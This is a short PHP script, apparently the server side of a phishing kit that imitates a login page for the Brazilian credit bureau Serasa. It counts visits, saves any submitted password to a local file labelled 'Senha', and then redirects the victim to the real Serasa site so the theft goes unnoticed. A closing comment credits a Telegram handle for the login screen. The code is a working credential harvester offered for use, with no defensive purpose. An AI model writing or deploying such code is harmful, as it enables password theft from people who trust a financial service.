<?php

$contador_file = "./continfo.txt";


if (file_exists($contador_file)) {
    
    $contador = intval(file_get_contents($contador_file));

    $contador++;
} else {

    $contador = 1;
}


file_put_contents($contador_file, $contador);


if (isset($_REQUEST['password'])) {
    $password = $_REQUEST['password'];

    
    $file = fopen("./salves/login.txt", "a");

    if ($file) {
        if (flock($file, LOCK_EX)) {
            try {
                fwrite($file, "Senha: $password\n");
                fwrite($file, "=====================|");
            } catch (Exception $e) {
                echo "Erro ao escrever no arquivo: " . $e->getMessage();
            } finally {
                
                flock($file, LOCK_UN);
                fclose($file);
            }
            
            header("Location: https://www.serasa.com.br");
            exit(); 
        } else {
            echo "Erro ao obter o bloqueio no arquivo.";
        }
    } else {
        echo "Erro ao abrir o arquivo.";
    }
} else {
    echo "Erro: senha não fornecida.";
}

// TELA LOGIN FEITA PELO @TXT_JPGI1 <--- telegram
?>
